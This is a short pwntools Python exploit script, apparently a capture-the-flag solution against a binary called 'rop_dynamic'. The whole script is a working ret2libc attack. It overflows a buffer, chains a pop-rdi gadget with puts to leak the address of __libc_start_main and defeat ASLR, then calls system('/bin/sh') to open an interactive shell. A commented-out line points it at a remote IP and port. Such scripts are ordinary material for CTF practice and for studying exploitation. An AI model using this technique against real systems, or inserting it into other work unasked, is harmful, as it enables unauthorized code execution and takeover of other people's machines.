from pwn import *
import time

main = p64 (0x000000000040119f)
pop_rdi = p64 (0x000000000040124b)
p = 0
elf = 0

def padding ():
    payload = b'a'*24
    return payload

def leak_payload (str_leak):
    ## LEAKING LIBC
    puts = p64 (elf.plt ['puts'])
    leak = p64 (elf.got [str_leak])

    payload = padding ()
    payload += pop_rdi
    payload += leak
    payload += puts
    payload += main
    return payload

def get_leak ():
    p.recvuntil (b'fool!\n')
    leaked = p.recvline ()
    #getting rid of \n
    leaked = leaked [:len (leaked) - 1]
    return u64 (leaked.ljust (8, b'\x00'))

def shell_payload (leak):
    #libc = ELF ('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF ('./libc6_2.28-10_amd64.so')
    libc.address = leak - libc.sym ['__libc_start_main']

    sh = p64 (next (libc.search (b'/bin/sh')))
    system = p64 (libc.sym ['system'])

    payload = padding ()
    payload += pop_rdi
    payload += sh
    payload += system

    return payload

def init ():
    global p
    global elf
    #p = remote ('168.119.123.141', 8092)
    p = process ('./rop_dynamic')
    elf = ELF ('./rop_dynamic')
    p.recvuntil (b'now!\n')

init ()

#by passing aslr and ret2libc
payload = leak_payload ('__libc_start_main')
print ('leak payload: %s' % payload)
p.sendline (payload)
leak = get_leak ()
log.success ('__libc_start_main: %s' % hex (leak))

payload = shell_payload (leak)
print (p.clean ())
p.sendline (payload)
p.interactive ()
